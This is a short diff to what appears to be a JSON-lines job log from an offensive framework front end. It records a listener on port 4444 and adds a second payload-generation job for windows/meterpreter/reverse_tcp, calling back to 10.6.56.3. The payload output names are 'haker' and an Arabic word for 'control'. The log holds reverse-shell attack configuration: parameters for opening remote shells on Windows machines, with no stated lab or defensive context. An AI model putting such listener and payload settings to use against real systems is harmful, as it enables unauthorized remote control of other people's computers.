@@ -1,2 +1,3 @@
 {"ts": 1754791119.9045663, "event": "submitted", "id": "c9f63869-listener", "date": "20250810", "kind": "listener", "state": "SUBMITTED", "params": {"lhost": "0.0.0.0", "lport": "4444", "payload": "windows/meterpreter/reverse_tcp"}}
 {"ts": 1754791295.290873, "event": "submitted", "id": "a99f31b7-payload", "date": "20250810", "kind": "payload", "state": "SUBMITTED", "params": {"lhost": "10.6.56.3", "lport": "4444", "output_name": "تحكم", "payload": "windows/meterpreter/reverse_tcp"}}
+{"ts": 1754791406.573719, "event": "submitted", "id": "5c38d5cd-payload", "date": "20250810", "kind": "payload", "state": "SUBMITTED", "params": {"lhost": "10.6.56.3", "lport": "4444", "output_name": "haker", "payload": "windows/meterpreter/reverse_tcp"}}
